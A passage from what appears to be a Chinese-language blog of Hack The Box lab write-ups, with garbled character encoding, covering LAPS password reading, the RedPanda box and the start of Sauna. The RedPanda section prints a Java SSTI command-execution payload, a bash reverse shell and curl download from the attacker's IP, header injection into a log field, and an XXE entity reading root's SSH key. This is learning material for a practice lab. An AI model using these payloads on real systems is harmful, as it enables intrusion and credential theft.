<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005712.png" ></p>
<h5 id="è¯»å–å¯†ç çš„ç¬¬äºŒç§æ–¹å¼"><a href="#è¯»å–å¯†ç çš„ç¬¬äºŒç§æ–¹å¼" class="headerlink" title="è¯»å–å¯†ç çš„ç¬¬äºŒç§æ–¹å¼"></a>è¯»å–å¯†ç çš„ç¬¬äºŒç§æ–¹å¼</h5><p>ä½¿ç”¨è¿™ä¸ªå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer DC01 -property &#x27;ms-mcs-admpwd&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Get-ADComputer</code> æ˜¯ä¸€ä¸ª PowerShell cmdletï¼Œç”¨äºè·å– Active Directory ä¸­è®¡ç®—æœºå¯¹è±¡çš„ä¿¡æ¯ã€‚<code>-property &#39;ms-mcs-admpwd&#39;</code> å‚æ•°æŒ‡å®šè¦è¿”å›çš„å±æ€§ï¼Œå…¶ä¸­ <code>&#39;ms-mcs-admpwd&#39;</code> æ˜¯è®¡ç®—æœºå¯¹è±¡å±æ€§çš„åç§°ã€‚</p>
<p>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯è·å–åä¸º â€œDC01â€ çš„è®¡ç®—æœºå¯¹è±¡çš„ â€œms-mcs-admpwdâ€ å±æ€§çš„å€¼ã€‚è¿™ä¸ªå±æ€§é€šå¸¸ç”¨äºå­˜å‚¨ LAPSï¼ˆLocal Administrator Password Solutionï¼‰ç”Ÿæˆçš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·çš„å¯†ç ã€‚ LAPS æ˜¯ä¸€ç§ Microsoft æä¾›çš„å·¥å…·ï¼Œç”¨äºç®¡ç† Windows è®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå¹¶ç¡®ä¿æ¯å°è®¡ç®—æœºä¸Šçš„å¯†ç æ˜¯å”¯ä¸€ä¸”å®šæœŸæ›´æ”¹çš„ã€‚</p>
<p>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤åï¼Œä½ å°†å¾—åˆ°åä¸º â€œDC01â€ çš„è®¡ç®—æœºå¯¹è±¡çš„ â€œms-mcs-admpwdâ€ å±æ€§çš„å€¼ï¼Œå³æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚</p>
<p>ï¼ˆæ¥è‡ªaiçš„è§£é‡Šï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.58.57.png" ></p>
<p>ä¹Ÿèƒ½è¯»åˆ°å¯†ç </p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æ•´ä½“æ€è·¯ï¼šCrackMapExecå‘ç°smbæœ‰å…±äº«èµ„æºâ€“&gt;æ‹¿åˆ°å‹ç¼©åŒ…â€“&gt;ä¸€ç³»åˆ—çˆ†ç ´è§£å¯†ç™»é™†ç¬¬ä¸€ä¸ªè´¦æˆ·â€“&gt;å†å²å‘½ä»¤æ–‡ä»¶ä¸­å‘ç°å¦ä¸€ä¸ªè´¦æˆ·è´¦å·å¯†ç â€“&gt;å‘ç°LAPSè¯»å–æƒé™â€“&gt;ç®¡ç†å‘˜å¯†ç è¯»å–</p>
<p>æ¶‰åŠçŸ¥è¯†ç‚¹ï¼špfxæ–‡ä»¶ï¼Œsmbclientæ‹¿åˆ°å…±äº«èµ„æºï¼Œwindowså†å²å‘½ä»¤æ–‡ä»¶ä½ç½®ï¼ŒLAPSæœåŠ¡</p>
<p>æ€è·¯ä¸ç®—éš¾ï¼Œå†™å®Œå¤ç›˜ä¹Ÿæ˜¯å¯¹windowså¤šäº†è§£äº†ä¸€äº›ğŸ™‹â€â™€ï¸</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb RedPandaå¤ç›˜</title>
    <url>/2024/09/24/htb-RedPanda%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â””â”€# nmap -sS -p- --min-rate=2000 10.10.11.170</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 16:21 HKT</span><br><span class="line">Warning: 10.10.11.170 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.170</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 64603 closed tcp ports (reset), 930 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>

<p>ç«¯å£æ‰«ææ‰«åˆ°8080ç«¯å£ï¼Œç›´æ¥è®¿é—®ï¼Œæœ‰ä¸ª&#x2F;searchï¼Œç„¶åç›®å½•æ‰«æä¹Ÿèƒ½çœ‹åˆ°&#x2F;statsï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›å›¾ç‰‡çš„è·¯å¾„ï¼Œè¿˜æœ‰ä¸¤ä¸ªä½œè€…åå­—ï¼Œè¿˜æœ‰ä¸€ä¸ªå¯ä»¥ç”Ÿæˆxmlæ–‡ä»¶ï¼ˆæ²¡ä»€ä¹ˆæ•æ„Ÿå†…å®¹ï¼‰çš„åŠŸèƒ½</p>
<p>ç„¶åçœ‹åˆ°ç½‘é¡µæºä»£ç å¯ä»¥çŸ¥é“è¿™ä¸ªæ˜¯ä¸ªspring bootåº”ç”¨</p>
<p>ä¸»è¦é’ˆå¯¹è¿™ä¸ªsearchï¼Œå°è¯•äº†sqlæ³¨å…¥ï¼Œæ— æœï¼Œåæ¥çœ‹åˆ°äº†å®˜æ–¹å¼•å¯¼ï¼Œæ‰çŸ¥é“å­˜åœ¨SSTIï¼ˆä¸‹æ¬¡åº”è¯¥è‡ªå·±è¯•å‡ºæ¥ï¼‰</p>
<h4 id="SSTIæ¼æ´"><a href="#SSTIæ¼æ´" class="headerlink" title="SSTIæ¼æ´"></a>SSTIæ¼æ´</h4><p>è¾“å…¥<code>*&#123;8*7&#125;</code>ï¼Œå›æ˜¾56ï¼ŒéªŒè¯äº†sstiæ¼æ´ï¼Œåœ¨hacktricksæ‰¾ä¸ªpayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924163217.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â””â”€# cat /var/www/html/a.sh</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.14/8888 0&gt;&amp;1</span><br><span class="line">ç¼–å†™payload</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;curl http://10.10.16.14ï¼š9999/a.sh -o /tmp/a.sh&#x27;).getInputStream())&#125;</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;bash /tmp/a.sh&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°shell</p>
<h4 id="é¶æœºå†…ä¿¡æ¯æœé›†"><a href="#é¶æœºå†…ä¿¡æ¯æœé›†" class="headerlink" title="é¶æœºå†…ä¿¡æ¯æœé›†"></a>é¶æœºå†…ä¿¡æ¯æœé›†</h4><p>&#x2F;optæ–‡ä»¶å¤¹ä¸‹é¢æœ‰æŒºå¤šä¸œè¥¿çš„ï¼Œè¦è€å¿ƒç¿»æ‰¾</p>
<p>åœ¨<code>/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code>æ–‡ä»¶é‡Œé¢èƒ½å¤Ÿçœ‹åˆ°woodenkç”¨æˆ·çš„è´¦å·å¯†ç ï¼Œæ‹¿å»ç™»é™†sshï¼Œå¯ä»¥æˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924164021.png" ></p>
<p>ç„¶åå®åœ¨å¤ªå¤šä¸œè¥¿ï¼Œæˆ‘è·‘äº†linpeaså’Œpspyï¼Œä¸»è¦æ˜¯pspy64ï¼Œå¯ä»¥çœ‹åˆ°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165009.png" ></p>
<p>rootæœ‰æ‰§è¡Œæœ‰å…³finalâ€¦çš„jaråŒ…ï¼Œåœ¨&#x2F;optä¸‹é¢ï¼Œwoodenkç”¨æˆ·è¿˜ä¼šå®šæ—¶åˆ é™¤xmlæ–‡ä»¶</p>
<p>æŠŠjaråŒ…scpä¼ è¾“åˆ°æœ¬åœ°ï¼Œç”¨jadxåç¼–è¯‘äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°äº†ä»£ç </p>
<h4 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165726.png" ></p>
<p>éœ€è¦å®¡è®¡ï¼Œè¿™éƒ¨åˆ†æˆ‘å°±æ˜¯å‚è€ƒåˆ«äººçš„wpåŠªåŠ›ç†è§£å¯ä»¥æ€ä¹ˆåˆ©ç”¨æ¼æ´</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JDOMException, IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">log_fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/opt/panda_search/redpanda.log&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">log_reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(log_fd);</span><br><span class="line">        <span class="keyword">while</span> (log_reader.hasNextLine()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> log_reader.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (isImage(line)) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">parsed_data</span> <span class="operator">=</span> parseLog(line);</span><br><span class="line">                System.out.println(parsed_data.get(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                <span class="type">String</span> <span class="variable">artist</span> <span class="operator">=</span> getArtist(parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">                System.out.println(<span class="string">&quot;Artist: &quot;</span> + artist);</span><br><span class="line">                <span class="type">String</span> <span class="variable">xmlPath</span> <span class="operator">=</span> <span class="string">&quot;/credits/&quot;</span> + artist + <span class="string">&quot;_creds.xml&quot;</span>;</span><br><span class="line">                addViewTo(xmlPath, parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>mainå‡½æ•°æŒ‰é¡ºåºè°ƒç”¨å‡ ä¸ªå‡½æ•°ï¼Œéƒ½æ˜¯åœ¨ä¸Šæ–‡è‡ªå®šä¹‰çš„</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseLog</span><span class="params">(String line)</span> &#123;</span><br><span class="line">        String[] strings = line.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;status_code&quot;</span>, Integer.valueOf(Integer.parseInt(strings[<span class="number">0</span>])));</span><br><span class="line">        map.put(<span class="string">&quot;ip&quot;</span>, strings[<span class="number">1</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;user_agent&quot;</span>, strings[<span class="number">2</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;uri&quot;</span>, strings[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parseLogå‡½æ•°å°±æ˜¯è¯»å–<code>/opt/panda_search/redpanda.log</code>ï¼Œç„¶åæŠŠé‡Œé¢çš„å‚æ•°ç”¨ï½œåˆ†å‰²ï¼Œå†ä¿å­˜ï¼Œå½¢å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">405||10.10.16.14||Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0||/error</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†mainå‡½æ•°è¿”å›é‚£ä¸ªå«<code>uri</code>çš„å‚æ•°ï¼Œåé¢è¦ç”¨</p>
<hr>
<p>æ¥ç€å¾€ä¸‹æ—¶getArtistå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getArtist</span><span class="params">(String uri)</span> <span class="keyword">throws</span> IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fullpath</span> <span class="operator">=</span> <span class="string">&quot;/opt/panda_search/src/main/resources/static&quot;</span> + uri;</span><br><span class="line">        <span class="type">File</span> <span class="variable">jpgFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fullpath);</span><br><span class="line">        <span class="type">Metadata</span> <span class="variable">metadata</span> <span class="operator">=</span> JpegMetadataReader.readMetadata(jpgFile);</span><br><span class="line">        <span class="keyword">for</span> (Directory dir : metadata.getDirectories()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Tag tag : dir.getTags()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tag.getTagName() == <span class="string">&quot;Artist&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> tag.getDescription();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;N/A&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°å…ˆå°†<code>/opt/panda_search/src/main/resources/static</code>å’Œuriå‚æ•°æ‹¼æ¥å‡ºä¸€ä¸ªè·¯å¾„ï¼ŒåŠ è½½é‚£å¼ å›¾ç‰‡ï¼Œç„¶åä½¿ç”¨JpegMetadataReaderè¯»å–å›¾ç‰‡é‡Œé¢çš„è¯¦ç»†ä¿¡æ¯ï¼Œç›¸å½“äºexiftoolï¼Œå¦‚æœå›¾ç‰‡è§£æå‡ºæ¥æœ‰<code>Artist</code>å­—æ®µï¼Œå°±è¿”å›ï¼Œå¦‚æœæ²¡æœ‰å°±è¿”å›ç©º</p>
<hr>
<p>æœ€åæ˜¯addViewToå‡½æ•°ï¼Œpathåœ¨mainå‡½æ•°æ‹¼æ¥å¥½äº†ï¼Œå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/credits/&quot; + artist + &quot;_creds.xml //artistå­—æ®µæ˜¯å‰é¢å‡½æ•°è¿”å›çš„</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯è§£æxmlæ–‡ä»¶ï¼Œå¢åŠ å›¾åƒçš„è®¡æ•°æ¬¡æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addViewTo</span><span class="params">(String path, String uri)</span> <span class="keyword">throws</span> JDOMException, IOException &#123;</span><br><span class="line">        <span class="type">SAXBuilder</span> <span class="variable">saxBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">        <span class="type">XMLOutputter</span> <span class="variable">xmlOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLOutputter</span>();</span><br><span class="line">        xmlOutput.setFormat(Format.getPrettyFormat());</span><br><span class="line">        <span class="type">File</span> <span class="variable">fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> saxBuilder.build(fd);</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getRootElement();</span><br><span class="line">        <span class="keyword">for</span> (Element el : rootElement.getChildren()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (el.getName() == <span class="string">&quot;image&quot;</span> &amp;&amp; el.getChild(<span class="string">&quot;uri&quot;</span>).getText().equals(uri)) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">totalviews</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).getText()) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Total views:&quot;</span> + Integer.toString(totalviews.intValue()));</span><br><span class="line">                rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).setText(Integer.toString(totalviews.intValue()));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">views</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(el.getChild(<span class="string">&quot;views&quot;</span>).getText()));</span><br><span class="line">                el.getChild(<span class="string">&quot;views&quot;</span>).setText(Integer.toString(views.intValue() + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fd));</span><br><span class="line">        xmlOutput.output(doc, writer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±å­˜åœ¨XXEæ¼æ´ï¼Œåœ¨ç½‘ç«™ç‚¹å‡»å¯¼å‡ºè¡¨æ ¼çš„åŠŸèƒ½æ—¶ï¼Œå°±ä¼šè§¦å‘ï¼Œè€Œä¸”åœ¨è¿™é‡Œè§£æçš„æ–‡ä»¶è·¯å¾„pathæ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶uriçš„å€¼ï¼Œæ§åˆ¶ <code>artist</code>å€¼</p>
<h4 id="ææƒæ“ä½œ"><a href="#ææƒæ“ä½œ" class="headerlink" title="ææƒæ“ä½œ"></a>ææƒæ“ä½œ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool shy.jpg -Artist=&quot;../home/woodenk/aaa&quot;</span><br></pre></td></tr></table></figure>

<p>å…ˆè‡ªå·±å‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œç”¨å·¥å…·å¢åŠ Artistå­—æ®µï¼Œç„¶åä¸Šä¼ åˆ°é¶æœº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:~$ cat aaa_creds.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY pencer SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; ]&gt;&lt;credits&gt;</span><br><span class="line">  &lt;author&gt;damian&lt;/author&gt;</span><br><span class="line">  &lt;image&gt;</span><br><span class="line">    &lt;uri&gt;../../../home/woodenk/shy.jpg&lt;/uri&gt;</span><br><span class="line">    &lt;hello&gt;&amp;pencer;&lt;/hello&gt;</span><br><span class="line">    &lt;views&gt;4&lt;/views&gt;</span><br><span class="line">  &lt;/image&gt;</span><br><span class="line">  &lt;totalviews&gt;4&lt;/totalviews&gt;</span><br><span class="line">&lt;/credits&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨é¶æœºæ–°å»ºä¸€ä¸ªxmlæ–‡ä»¶ï¼Œé‡Œé¢ä½¿ç”¨åˆ°æ–‡ä»¶è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080 -H &quot;User-Agent: ||/../../../../../../../home/woodenk/shy.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>curlè®¿é—®ï¼Œå¢åŠ å­—æ®µåˆ°logæ–‡ä»¶ï¼Œè¿™ä¸€æ­¥æ˜¯åœ¨æ§åˆ¶uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:/opt/panda_search$ ^[[A</span><br><span class="line">cat redpanda.log </span><br><span class="line"></span><br><span class="line">200||10.10.16.14||||/../../../../../../../home/woodenk/shy.jpg||/</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬åœ¨UAå¤´å‰é¢å¤šæ’å…¥äº†ä¸€ä¸ª||ï¼Œè¿™æ ·æœ¬æ¥æ˜¯ç¬¬ä¸‰ä¸ªå­—æ®µçš„uaå¤´è¢«æˆ‘ä»¬æ§åˆ¶æˆç¬¬å››ä¸ªï¼Œä¹Ÿå°±æ˜¯uri</p>
<p>æœ€åè®¿é—®ç½‘å€è§¦å‘åŠŸèƒ½ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080/export.xml?author=damian</span><br></pre></td></tr></table></figure>

<p>ç­‰ä¸€ä¼šï¼Œå†æŸ¥çœ‹aaa_creds.xmlï¼Œå°±èƒ½çœ‹åˆ°æˆ‘ä»¬è¦è¯»å–åˆ°å†…å®¹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”¨id_rsaç™»é™†rootï¼Œç»“æŸã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924191714.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶æœºè¿˜æŒºæœ‰æ„æ€çš„ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦javaçš„sstiï¼Œè™½ç„¶è¿™æ¬¡æ˜¯ç›´æ¥å¥—payloadï¼Œç„¶åé¶æœºå†…ä¿¡æ¯æœé›†ä¹ŸæŒºéœ€è¦è€å¿ƒçš„ï¼Œä»£ç å®¡è®¡è§¦å‘xxeæ¼æ´é‚£å—ï¼Œä¸€å¼€å§‹çœ‹wpè¿˜æ„Ÿè§‰å¾ˆéº»çƒ¦ï¼Œè‡ªå·±å†™å¤ç›˜ä¸€è·¯é¡ºä¸‹æ¥æ‰ç†è§£ï¼Œå­¦ä¹ äº†ã€‚</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Saunaå¤ç›˜</title>
    <url>/2024/04/09/htb-Sauna%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>ç»§ç»­è®°å½•å­¦ä¹ ğŸ“‘</p>
<h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p>å®˜æ–¹wp</p>
<p><a class="link"   href="http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/" >http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/network/286137.html" >https://m.freebuf.com/articles/network/286137.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_34801745/article/details/108136791" >https://blog.csdn.net/qq_34801745/article/details/108136791<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://app.hackthebox.com/machines/Sauna" >https://app.hackthebox.com/machines/Sauna<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<p>ipï¼š<strong>10.10.10.175</strong></p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>å…ˆæ‰«ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.10.175</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184941.png"   style="zoom:30%;" >

<p>æ‰«å‡ºæ¥æœ‰å¾ˆå¤šä¸ªç«¯å£ï¼Œæœ‰kerberos+ldapç­‰ï¼Œå¤§æ¦‚ç‡æ˜¯åŸŸæ§ï¼ŒåŸŸåï¼šEGOTISTICAL-BANK.LOCAL0.</p>
<h5 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\\\10.10.10.175 -N</span><br></pre></td></tr></table></figure>

<p>å°è¯•smbåŒ¿åç™»é™†ï¼Œæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409185909.png" ></p>
<h5 id="ldapæšä¸¾"><a href="#ldapæšä¸¾" class="headerlink" title="ldapæšä¸¾"></a>ldapæšä¸¾</h5><p>å¯¹äº389çš„ladpæœåŠ¡ï¼Œå­˜åœ¨ä¸€ä¸ªåŒ¿åç»‘å®šåŠŸèƒ½ï¼Œé€šè¿‡è¿™ä¸ªåŠŸèƒ½å¯ä»¥ä¸é€šè¿‡èº«ä»½è®¤è¯æŸ¥è¯¢ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºä¿¡æ¯ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨<a class="link"   href="https://github.com/ropnop/windapsearch" >windapsearch<i class="fas fa-external-link-alt"></i></a>çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨æˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190131.png" ></p>
<p>æ²¡æœ‰ä»€ä¹ˆæ”¶è·</p>
<h5 id="webç«¯"><a href="#webç«¯" class="headerlink" title="webç«¯"></a>webç«¯</h5><p>80ç«¯å£æœ‰å¼€æ”¾ï¼Œå¯ä»¥è®¿é—®åˆ°ç½‘é¡µï¼Œæç¤ºæ˜¯è¯´æœ‰ä¸ªabout.htmlï¼Œé‡Œé¢æœ‰å¾ˆå¤šäººå</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184647.png"   style="zoom:50%;" >

<p>æ”¶é›†èµ·æ¥å»ºä¸€ä¸ªuser.txtï¼Œç„¶åç”¨<a class="link"   href="https://github.com/urbanadventurer/username-anarchy" >username-anarchy<i class="fas fa-external-link-alt"></i></a>ç”Ÿæˆä¸€ä¸ªå­—å…¸</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184624.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./username-anarchy --input-file user.txt --select-format first,flast,first.last,firstl &gt; unames.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190453.png" ></p>
<h5 id="ç«‹è¶³ç‚¹"><a href="#ç«‹è¶³ç‚¹" class="headerlink" title="ç«‹è¶³ç‚¹"></a>ç«‹è¶³ç‚¹</h5><p>ç”¨å­—å…¸å¯ä»¥æŸ¥çœ‹æ˜¯å¦æœ‰ç”¨æˆ·ä¸éœ€è¦ç»è¿‡Kerberosé¢„èº«ä»½éªŒè¯ã€‚å¦‚æœå­˜åœ¨é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å…¶å¯†ç hash</p>
<blockquote>
<p> Kerberos é¢„â¾ä»½éªŒè¯æ˜¯â¼€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œå¯é˜²â½Œå¯†ç çŒœæµ‹æ”»å‡»ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåº”â½¤ç¨‹åºéœ€è¦ä¸ºå…¶æœåŠ¡å¸â¼¾å¯â½¤æ­¤è®¾</p>
